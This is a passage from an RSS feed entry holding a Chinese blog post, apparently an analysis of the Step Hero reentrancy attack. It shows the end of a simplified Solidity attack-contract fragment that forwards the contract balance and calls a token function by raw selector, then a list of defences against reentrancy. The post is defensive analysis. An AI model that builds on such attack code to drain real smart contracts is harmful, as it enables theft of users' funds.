&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;// 复杂的外部调用逻辑，可能涉及 delegatecall 或其他操作
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;// 这里简化表示
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        (&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;bool&lt;/span&gt; success, ) = token1.&lt;span style=&#34;color:#658b00&#34;&gt;call&lt;/span&gt;{&lt;span style=&#34;color:#658b00&#34;&gt;value&lt;/span&gt;: &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;address&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;this&lt;/span&gt;).&lt;span style=&#34;color:#658b00&#34;&gt;balance&lt;/span&gt;}(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#658b00&#34;&gt;require&lt;/span&gt;(success, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;call failed&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;// 调用 token1 的函数 0x50eb1dfe
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        (&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;bool&lt;/span&gt; success2, ) = token1.&lt;span style=&#34;color:#658b00&#34;&gt;call&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#658b00&#34;&gt;abi&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;encodeWithSelector&lt;/span&gt;(&lt;span style=&#34;color:#b452cd&#34;&gt;0x50eb1dfe&lt;/span&gt;, token2, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;address&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;this&lt;/span&gt;).&lt;span style=&#34;color:#658b00&#34;&gt;balance&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#658b00&#34;&gt;require&lt;/span&gt;(success2);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;解决方案&#34;&gt;解决方案&lt;/h2&gt;
&lt;p&gt;为了防止类似的重入攻击，可以采取以下措施：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;使用 Checks-Effects-Interactions 模式&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;先更新状态，再进行外部调用，以避免重入风险。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;使用 &lt;code&gt;ReentrancyGuard&lt;/code&gt;&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;通过 OpenZeppelin 提供的 &lt;code&gt;nonReentrant&lt;/code&gt; 修饰符，防止函数的嵌套调用。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;避免直接调用 &lt;code&gt;call&lt;/code&gt; 进行转账&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;推荐使用 &lt;code&gt;transfer&lt;/code&gt; 或 &lt;code&gt;send&lt;/code&gt;，虽然限制了 GAS，但能降低重入攻击的风险。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
- http://localhost:1313/posts/vol.1--step-hero%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/ - Rise. 本站遵循 CC-BY-NC 4.0 协议</description>
        </item>
    
    
  </channel>
</rss> 